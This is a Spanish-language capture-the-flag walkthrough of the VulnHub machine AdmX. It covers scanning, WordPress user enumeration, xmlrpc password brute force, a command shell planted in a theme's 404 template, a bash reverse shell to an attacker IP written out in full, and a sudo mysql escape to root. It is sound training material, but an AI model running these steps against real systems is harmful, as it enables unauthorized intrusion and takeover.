#ctf-machine #vulnhub #easy-machine #linux  [VulnhubLink](https://download.vulnhub.com/admx/AdmX_new.7z)

## Enumeración inicial
Como no conocemos la dirección IPv4 de la máquina víctima, hacemos un escaneo ARP con `arpscan` para identificarla:
![[Pasted image 20240909144339.png]]

Como vemos, la máquina objetiva es la "192.168.159.154", ya que su OUI es "00:0c" correspondiente a las máquinas que se importan en VMWare.

Lanzamos una traza ICMP con `ping` y como vemos su TTL es 64 por lo que probablemente se trate de una máquina Linux, ya que suelen tener este valor de TTL:
![[Pasted image 20240909144531.png]]

### Nmap
Hacemos un primer escaneo con `nmap` para identificar los puertos TCP abiertos:
![[Pasted image 20240909144732.png]]

Como vemos, solo hay un puerto abierto, el puerto 80. 

Hacemos un segundo escaneo para detectar la versión y servicio que corren para este puerto:
![[Pasted image 20240909144851.png]]

Como vemos, se trata de una máquina Linux Ubuntu. Y está ejecutando el servicio de Apache.

Hacemos un tercer escaneo para identificar algunos directorios web:
![[Pasted image 20240909145115.png]]

Como vemos se trate de un WordPress.


## Enumeración web
Si accedemos a la web, vemos la página por defecto de Apache:
![[Pasted image 20240909145253.png]]

Si utilizamos `gobuster` para buscar directorios, encontramos lo siguiente:
![[Pasted image 20240909150047.png]]

Como vemos aparece el directorio `/wordpress` encontrado anteriormente con `nmap` además de un directorio llamado `/tools`.

Si ejecutamos la herramienta `wpscan`, vemos que el archivo `xmlrpc.php` está activo:
```bash
wpscan --url http://192.168.159.154/wordpress/ --api-token XXXXXXXXXXXXXXXXXXXXXXXX --plugins-detection aggressive
```
![[Pasted image 20240909150644.png]]

Podemos hacer un segundo escaneo con `wpscan` para encontrar usuarios válidos y probar de hacer fuerza bruta de credenciales:
```bash
wpscan --url http://192.168.159.154/wordpress/ --api-token XXXX --enumerate u
```
![[Pasted image 20240909152655.png]]

Como vemos, hay un usuario válido por lo que podemos utilizar el archivo `xmlrpc.php` para hacer fuerza bruta de la contraseña.
![[Pasted image 20240909155117.png]]

Como vemos la contraseña es "adam14" para el usuario "admin" por lo que podemos obtener acceso al panel de administrador mediante `/wordpress/wp-login.php`:
![[Pasted image 20240909161944.png]]

Por lo que accedemos al "Theme Editor", seleccionamos el "404 template":
![[Pasted image 20240909162015.png]]

Y le añadimos el siguiente código al tema "Twenty Nineteen":
![[Pasted image 20240909162115.png]]

Por lo que lo activamos en el panel de "Themes":
![[Pasted image 20240909163430.png]]

Por lo que una vez activo, únicamente accedemos a una página no existente y utilizamos el parámetro "cmd" para ejecutar comandos.
![[Pasted image 20240909163815.png]]

Por lo que si ejecutamos el siguiente comando nos podemos entablar una *reverse shell*:
```bash
bash -c "bash -i >& /dev/tcp/192.168.159.131/443 0>&1"
```

Siempre y cuando nos pongamos en escucha con `nc` por el puerto 443:
![[Pasted image 20240909171125.png]]

Por lo que hacemos el tratamiento de la TTY:
![[Pasted image 20240909171211.png]]![[Pasted image 20240909171241.png]]

## Escalada de privilegios
Si mostramos los usuarios disponibles vemos que solo hay 2:
![[Pasted image 20240909172115.png]]

Por lo que si intentamos migrar al usuario "wpadmin" con la contraseña que ya teníamos, obtenemos acceso:
![[Pasted image 20240909172205.png]]

Por lo que podemos visualizar la primera *flag* en `/home/wpadmin/`:
![[Pasted image 20240909172237.png]]

Si mostramos los permisos a nivel de *sudoers* del usuario "wpadmin", vemos el siguiente:
![[Pasted image 20240909172354.png]]

Por lo que si ejecutamos el comando y utilizamos la utilidad de `mysql` que permite ejecutar comandos de *shell*, obtenemos una "bash" como *root*:
![[Pasted image 20240909172951.png]]

Finalmente, accedemos al directorio `/root` y visualizamos la *flag*:
![[Pasted image 20240909173025.png]]


___
#xmlrpc #wordpress #web-enumeration #password-brute-force #abusing-sudoers 
___